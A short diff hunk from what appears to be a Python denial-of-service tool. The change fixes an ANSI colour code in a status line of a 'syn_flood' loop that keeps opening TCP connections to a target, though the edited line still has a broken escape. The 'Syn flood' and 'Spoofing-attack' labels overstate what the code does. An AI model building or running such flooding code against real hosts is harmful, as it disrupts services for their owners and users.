@@ -109,7 +109,7 @@ def syn_flood(ip, port, duration):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
             sent += 1
-            print(f"\033[100m\033[97mSyn flood\033[0m \033[32m{sent} \033[96m{ip}\033[0m 033[37Spoofing-attack")
+            print(f"\033[100m\033[97mSyn flood\033[0m \033[32m{sent} \033[96m{ip}\033[0m 033[37mSpoofing-attack")
             print(f"\033[48;5;7m\033[30mSyn flood\033[0m \033[33m{sent} \033[94m{ip} \033[1mSpoofing-attack\033[0m")
             sock.close()
         except OSError:
